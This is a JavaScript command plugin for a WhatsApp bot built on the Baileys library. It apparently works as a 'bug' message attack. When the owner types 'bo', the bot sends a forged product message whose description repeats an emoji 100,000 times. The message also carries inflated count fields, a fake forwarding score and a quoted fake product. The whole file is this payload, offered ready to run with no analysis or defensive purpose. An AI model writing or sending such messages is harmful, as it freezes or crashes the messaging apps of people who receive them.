const { MessageType } = require('@adiwajshing/baileys')
let axios = require("axios");
const fs = require('fs')
let handler = async (m, { conn }) => {
  sumberImg = fs.readFileSync(`./src/logo.jpg`)
  image = (await conn.prepareMessage('0@s.whatsapp.net', sumberImg, MessageType.image, { thumbnail: Buffer.alloc(0) })).message.imageMessage
   const xixi = {
	                  key : {
                                participant : '0@s.whatsapp.net'
                               },
                    message: {
	"productMessage": {
		"product": {
			"productImage": image, 
			"title": "OPEN BO", //Kasih namalu 
			"description": "SELF BOT", 
			"currencyCode": "IDR",
			"priceAmount1000": "99999990000",
			"retailerId": "XyZ666xx",
			"productImageCount": 10
		},
			"businessOwnerJid": `0@s.whatsapp.net`
}
}
          }
  res = await conn.prepareMessageFromContent(m.chat, {
    "productMessage": {
      "product": {
        "productImage": image,
        "productId": "410988817914043",
        "title": "OPEN BO KAK",
        "description": `🔥`.repeat(100000),
        "retailerId": "XyZ666xx",
        "descriptionCount": "99999999999",
        "productImageCount": "10",
      },
      "businessOwnerJid": "628882611841@s.whatsapp.net",
      "contextInfo": {
        "forwardingScore": 9999,
        "isForwarded": true
      }
    }
  },
    { quoted: xixi })
  conn.relayWAMessage(res)
}
handler.command = /^(bo)$/
handler.help = ['bo']
handler.tags = ['main', 'update']
handler.owner = true

module.exports = handler
